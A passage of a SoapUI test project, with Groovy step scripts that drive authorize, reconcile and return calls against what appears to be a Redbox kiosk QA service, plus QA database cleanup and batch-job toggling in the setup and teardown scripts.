	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="9b32778b-10d5-4640-b4f4-857f767d00c5"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual" id="78164931-fff4-4eb2-ba63-088f3ce5a40f" disabled="true"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Reconcile" id="6dd0606a-abae-4bb6-ac8f-dc04fdf085cf"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Copy of Manual" id="4b691dbd-68cf-4bcf-b032-e1195b6c262b" disabled="true"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Return" id="3c4acae7-9cd2-4906-baa3-3113262ecd0d" disabled="true"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="3c623f7b-fb96-4ab0-939f-f6362c03eea0" disabled="true"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="6a2be374-0db7-4a4f-9628-b2950a11ac63" disabled="true"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:testStep type="groovy" name="Done" id="9219d365-2e10-4344-a9f9-7facdeb3c632"><con:settings/><con:config><script>def rowCount = Integer.valueOf(context.expand( '${#TestCase#RowCount}' ))
if (rowCount &lt; 2001)
{
	log.info ("Done");
	testRunner.gotoStepByName('Counter');
}
else
{
	log.info ("Completed Generating the Transaction")
}</script></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1684484</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148758840</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Reconcile FINISHED</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value/></con:property><con:property><con:name>StartTime</con:name><con:value>03/01/18-10:29:15.464</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>03/01/18-10:37:15.457</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>RowCount</con:name><con:value>2001</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="02da57a1-6b19-4c20-9806-67cee0f24d7e" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="MNP" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0" disabled="true"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="64cfb66f-1239-4309-8895-94028e82178f"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="94df59b8-9ed4-4f77-b664-d1d03ecc8d63"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>${projectDir}/KS-DataSource.xls</file><worksheet>MNP</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:property>MNP</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="6fa0cf41-f8d8-4c5b-bcf3-bea6fbba2bcc"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="6f5dcde1-9b98-4d84-9c19-b922d7fe1989"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("MNPFlag", context.expand( '${DataSource#MNPFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
